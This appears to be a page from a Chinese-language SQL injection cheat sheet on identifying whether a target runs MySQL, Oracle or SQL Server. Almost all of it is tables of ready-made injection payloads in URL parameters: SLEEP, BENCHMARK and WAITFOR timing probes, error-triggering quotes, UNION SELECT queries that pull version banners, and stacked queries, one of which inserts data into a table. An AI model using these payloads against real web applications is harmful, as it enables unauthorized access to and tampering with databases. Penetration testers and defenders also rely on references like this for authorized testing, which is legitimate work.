
###   DBMS识别 {docsify-ignore-all}

检测正在使用的数据库管理系统（DBMS）对于进一步利用注入来说至关重要。没有这些知识，就无法确定要查询的表，内置的函数以及要避免的检测。下面查询的成功响应表明正在使用所选的DBMS.

注意：注释字符 `--` 放置在查询后面，以删除查询后面的任何命令，有助于防止出现错误。


#### MySQL
| 描述   |      语句     |  
|----------|:-------------:|
| SLEEP |   page.php?id=1'-SLEEP(1)=0 LIMIT 1 --|
| BENCHMARK  |      page.php?id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --     | 
| 字符串连接   |     page.php?id=' 'mysql' --     | 
| 错误消息<br />注意：通过无效语法触发数据库错误<br />有时会返回包含DBMS名称的详细错误消息。   |      page.php?id='   | 



#####   一般提示

PHP应用程序通常具有MySQL数据库。

#####  将查询转换为注入

既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。`SELECT @@version`将是示例查询。

| 描述   |      语句     |  
|----------|:-------------:|
| 联合查询    |      product.php?id=' UNION SELECT @@version --     |  
| 联合子查询   |      product.php?id=' UNION (SELECT @@version) --     |  
| 联合null <br />注意：如果原始查询返回多个列，<br />则添加null以等于列数    |      product.php?id=4 UNION SELECT @@version,null --      |  
| 堆积式查询<br />注意：堆积式查询并不总是返回结果，<br />因此它们最适合用于更新/修改数据的注入。   |      product.php?id='; INSERT INTO 'docs' ('content') VALUES ((SELECT @@version)) --     |  





#### Oracle
| 描述   |      语句     |  
|----------|:-------------:|
| 字符串连接   |      page.jsp?id='&#124;&#124;'oracle' --     |  
| 默认表   |     page.jsp?id='UNION SELECT 1 FROM v$version --     |  
| 错误消息<br />注意：通过无效语法触发数据库错误<br />有时会返回包含DBMS名称的详细错误消息。  |      page.jsp?id='   |  
 

#####   一般提示

根据应用程序提供的错误，如果存在“ORA-XXXX”错误，其中每个X都是整数，则表示数据库是Oracle.

JSP应用程序通常具有Oracle数据库。



#####  将查询转换为注入


既然已经确定了诸如点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。`SELECT banner FROM v$version`将是示例查询。


| 描述   |      语句     |  
|----------|:-------------:|
| 联合查询   |      product.jsp?id=' UNION SELECT banner FROM v$version --     |  
| 联合子查询   |      product.jsp?id=' UNION (SELECT banner FROM v$version) --     |  
| 联合null <br />注意:如果原始查询返回多个列，<br />则添加null以等于列数-1  |      product.jsp?id=' UNION SELECT banner,null FROM v$version --      |  



  

####  SQL Server

| 描述   |      语句     |  
|----------|:-------------:|
| WAITFOR 函数   |      page.asp?id=';WAITFOR DELAY '00&#58;00&#58;10'; --     | 
| 默认变量   |      page.asp?id=sql'; SELECT @@SERVERNAME --     | 
| 错误消息<br />注意：通过无效语法触发数据库错误<br />有时会返回包含DBMS名称的详细错误消息。   |      page.asp?id='  |  
| 错误消息<br />注意：如果id参数是整数，<br />则@@ SERVERNAME变量的字符串值可能导致转换错误。   |      page.asp?id=@@SERVERNAME     | 
| 错误消息<br />注意：如果id参数是整数，<br />则@@ SERVERNAME变量的字符串值可能导致转换错误。   |      page.asp?id=0/@@SERVERNAME     |  


###  一般提示
基于ASP / ASPX的应用程序一般都是MSSQL。

### 将查询转换为注入


既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。`SELECT @@version`将是示例查询。



| 描述   |      语句     |  
|----------|:-------------:|
| 联合查询   |      product.asp?id=' UNION SELECT @@version --     | 
| 联合子查询  |      product.asp?id=' UNION (SELECT @@version) --     |
| 联合null <br />注意：如果原始查询返回多个列，<br />则添加null以等于列数   |      product.asp?id=' UNION (SELECT @@version,null) --      |   
| 堆积式查询<br />注意：堆积式查询并不总是返回结果，<br />因此它们最适合用于更新/修改数据的注入。   |      product.asp?id='; SELECT @@version --     | 




    

    
